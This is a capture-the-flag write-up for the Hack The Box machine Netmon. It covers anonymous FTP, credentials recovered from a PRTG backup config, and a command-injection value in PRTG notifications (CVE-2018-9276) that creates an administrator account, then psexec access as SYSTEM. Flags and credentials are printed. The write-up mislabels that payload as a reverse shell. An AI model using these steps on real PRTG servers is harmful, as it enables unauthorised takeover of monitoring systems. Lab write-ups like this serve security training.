# HTB: Netmon

## Engagement Overview

**Target:** Netmon  
**Box IP:** 10.10.10.152  
**Local IP:** 10.10.14.16   
**Date:** 2025-07-22

---

### Objectives

- Gain root access

---

## Service Enumeration

### Nmap Summary

```bash
nmap -sCV -oA nmap.txt 10.10.10.152
```

**Open Ports and Services:**
- **21/tcp** - FTP: Microsoft ftpd  
  - Anonymous login allowed
  - Exposed directory structure with config files
- **80/tcp** - HTTP: Indy httpd (Paessler PRTG)  
  - Version: 18.1.37.13946
  - Web interface accessible
- **135, 139, 445/tcp** - Windows RPC / SMB  
  - Windows Server 2008 R2 - 2012
  - Message signing not required
- **5985/tcp** - Microsoft HTTPAPI

**Host Notes:**
- SMB: Message signing disabled
- Anonymous access enabled

---

## Initial Access

### Vulnerability

- **CVE-2018-9276** – Authenticated RCE via PRTG Notifications

### Approach

1. Logged into FTP using anonymous access:
   - Discovered backup files:
     ```
     PRTG Configuration.old.bak
     ```
   - Downloaded `.bak` config file via FTP

2. Extracted credentials from config file:
   ```
   user: prtgadmin
   pass: PrTg@dmin2019
   ```

3. Logged into PRTG web interface at `http://10.10.10.152`:
   - Version: 18.1.37.13946
   - Vulnerable to CVE-2018-9276

---

## Privilege Escalation

### Exploit Method

- Injected reverse shell payload into the **PRTG Notification** system:
  ```plaintext
  abc.txt | net user htb abc123! /add & net localgroup administrators htb /add
  ```

- Executed the notification, then used `impacket-psexec` with the new user:
```bash
impacket-psexec htb:'abc123!'@10.10.10.152
```

### Result

- Logged in as **NT AUTHORITY\SYSTEM**
- Retrieved root flag successfully:
  ```
  C:\Users\Administrator\Desktop> type root.txt
  1fd2f7f093ba33f259d228549f100af6
  ```

---

## Post-Exploitation

### Flags

- **User Flag:** `1cfe7df9dbd51bcb426b0b8407544209`
- **Root Flag:** `1fd2f7f093ba33f259d228549f100af6`

### Credentials Dumped

- `prtgadmin` / `PrTg@dmin2019`

---

## Tools Utilized

- Nmap  
- FTP  
- Impacket (psexec.py)  
- Metasploit (optional, noted in research)

---

## House Cleaning

- No persistent users or shells left
- Access obtained and closed out after flag retrieval

---

## Key Takeaways

- Classic CVE exploitation with real-world software (PRTG)
- Importance of scanning for backup config files on exposed FTP
- Enumeration + light analysis = full box compromise
